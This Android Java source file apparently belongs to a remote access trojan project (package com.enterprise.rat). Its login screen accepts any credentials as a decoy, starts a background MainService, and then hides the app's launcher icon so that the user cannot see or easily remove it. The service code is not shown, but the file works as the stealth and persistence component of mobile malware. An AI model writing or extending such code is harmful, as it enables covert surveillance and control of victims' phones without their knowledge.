package com.enterprise.rat;

import android.app.Activity;
import android.content.Intent;
import android.os.Bundle;
import android.view.View;
import android.widget.Button;
import android.widget.EditText;
import android.widget.TextView;
import com.enterprise.rat.services.MainService;

public class LoginActivity extends Activity {
    private EditText username, password;
    private TextView errorText;

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_login);

        username = findViewById(R.id.username);
        password = findViewById(R.id.password);
        errorText = findViewById(R.id.error_text);
        Button loginButton = findViewById(R.id.login_button);

        loginButton.setOnClickListener(v -> {
            String user = username.getText().toString().trim();
            String pass = password.getText().toString().trim();

            // Dummy credentials — semua diterima
            if (!user.isEmpty() && !pass.isEmpty()) {
                // Start MainService
                Intent serviceIntent = new Intent(this, MainService.class);
                if (android.os.Build.VERSION.SDK_INT >= android.os.Build.VERSION_CODES.O) {
                    startForegroundService(serviceIntent);
                } else {
                    startService(serviceIntent);
                }

                // Sembunyikan ikon dan tutup activity
                hideAppIcon();
                finish();
            } else {
                errorText.setVisibility(View.VISIBLE);
                errorText.setText("Username and password are required.");
            }
        });
    }

    private void hideAppIcon() {
        try {
            getPackageManager().setComponentEnabledSetting(
                new android.content.ComponentName(this, MainActivity.class),
                android.content.pm.PackageManager.COMPONENT_ENABLED_STATE_DISABLED,
                android.content.pm.PackageManager.DONT_KILL_APP);
        } catch (Exception e) {}
    }
}
